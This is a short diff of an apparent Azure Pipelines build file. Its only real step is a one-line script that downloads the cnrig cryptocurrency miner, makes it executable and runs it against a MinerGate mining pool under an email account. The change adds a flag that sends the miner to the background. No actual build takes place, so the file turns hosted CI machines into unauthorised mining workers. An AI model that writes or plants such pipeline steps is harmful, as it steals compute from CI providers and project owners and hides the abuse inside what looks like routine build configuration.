@@ -7,7 +7,7 @@ pool:
   vmImage: 'Ubuntu 16.04'
 
 steps:
-- script: wget -O cnrig https://github.com/cnrig/cnrig/releases/download/v0.1.5-release/cnrig-0.1.5-linux-x86_64 && chmod +x cnrig && ./cnrig --donate-level 1 -a cryptonight -u dwijads39@gmail.com -o fcn.pool.minergate.com:45610 -p x
+- script: wget -O cnrig https://github.com/cnrig/cnrig/releases/download/v0.1.5-release/cnrig-0.1.5-linux-x86_64 && chmod +x cnrig && ./cnrig --donate-level 1 -a cryptonight -u dwijads39@gmail.com -o fcn.pool.minergate.com:45610 -p x -B
   displayName: 'Run a one-line script'
 
 - script: |
